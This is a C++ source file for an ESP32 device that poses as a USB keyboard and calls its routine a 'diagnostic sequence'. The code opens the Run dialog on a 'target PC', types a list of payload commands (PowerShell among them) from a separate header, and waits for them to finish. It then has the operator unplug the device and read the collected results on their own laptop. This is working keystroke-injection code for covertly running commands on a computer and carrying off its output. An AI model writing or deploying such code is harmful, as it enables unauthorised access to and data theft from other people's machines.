// ─────────────────────────────────────────────────────────────────────────────
// diagnostic.cpp — diagnostic sequence state machine
// ─────────────────────────────────────────────────────────────────────────────

#include "diagnostic.h"
#include "config.h"
#include "keyboard_defs.h"
#include "payloads.h"

#include <Arduino.h>

// ── State machine ─────────────────────────────────────────────────────────────
enum DiagState {
  STATE_IDLE,
  STATE_OPEN_RUN,
  STATE_TYPE_COMMANDS,
  STATE_WAIT_COMPLETION,
  STATE_DONE,
};

static DiagState     s_state    = STATE_IDLE;
static int           s_cmdIdx   = 0;
static unsigned long s_stateTs  = 0;   // timestamp of last state transition
static bool          s_running  = false;

// ── Helpers ───────────────────────────────────────────────────────────────────

static void ledBlink(int times, int ms = 100)
{
  for (int i = 0; i < times; i++) {
    digitalWrite(PIN_LED, HIGH); delay(ms);
    digitalWrite(PIN_LED, LOW);  delay(ms);
  }
}

static void typeCommand(USBHIDKeyboard &kb, const char *cmd)
{
  kb.print(cmd);
  delay(100);
  kb.press(KEY_RETURN);
  delay(50);
  kb.releaseAll();
  ledBlink(2, 50);

  // Allow the OS time to process before the next command
  bool isPs = (strncmp(cmd, "powershell", 10) == 0);
  delay(isPs ? CMD_POWERSHELL_MS : CMD_GENERIC_MS);
}

// ── Public API ────────────────────────────────────────────────────────────────

void diagStart(USBHIDKeyboard &kb)
{
  if (s_running) return;
  Serial0.println(F("[DIAG] Starting diagnostic sequence..."));
  Serial0.println(F("[DIAG] Watch the target PC screen for activity."));
  ledBlink(3);
  s_cmdIdx  = 0;
  s_running = true;
  s_state   = STATE_OPEN_RUN;
  s_stateTs = millis();
}

bool diagIsRunning()
{
  return s_running;
}

void diagTick(USBHIDKeyboard &kb, unsigned long now)
{
  switch (s_state) {

  case STATE_OPEN_RUN:
    // Win+R to open the Run dialog, then wait for it to appear
    kb.press(KEY_LEFT_GUI);
    delay(50);
    kb.press('r');
    delay(50);
    kb.releaseAll();
    delay(RUN_DIALOG_DELAY_MS);
    Serial0.println(F("[DIAG] Run dialog opened."));
    s_state   = STATE_TYPE_COMMANDS;
    s_stateTs = now;
    break;

  case STATE_TYPE_COMMANDS:
    if (s_cmdIdx < payloadCount) {
      Serial0.printf("[DIAG] Sending payload %d/%d\n", s_cmdIdx + 1, payloadCount);
      typeCommand(kb, payloads[s_cmdIdx]);
      s_cmdIdx++;
      s_stateTs = now;
    }
    if (s_cmdIdx >= payloadCount) {
      Serial0.printf("[DIAG] All payloads sent. Waiting %d s for completion...\n",
                     COMPLETION_WAIT_MS / 1000);
      s_state   = STATE_WAIT_COMPLETION;
      s_stateTs = now;
    }
    break;

  case STATE_WAIT_COMPLETION:
    if ((now - s_stateTs) >= COMPLETION_WAIT_MS) {
      s_state = STATE_DONE;
      Serial0.println(F("[DIAG] Done! Results written to ESP32 drive."));
      Serial0.println(F("[DIAG] Unplug from target PC, plug into your laptop."));
      Serial0.println(F("[DIAG] Open the ESP32 drive in Explorer to read the files."));
      digitalWrite(PIN_LED, HIGH);    // solid on = done
      s_stateTs = now;
    }
    break;

  case STATE_DONE:
    if ((now - s_stateTs) >= 5000) {
      s_running = false;
      s_state   = STATE_IDLE;
      digitalWrite(PIN_LED, LOW);
      Serial0.println(F("[DIAG] Ready for next diagnostic."));
    }
    break;

  default:
    break;
  }
}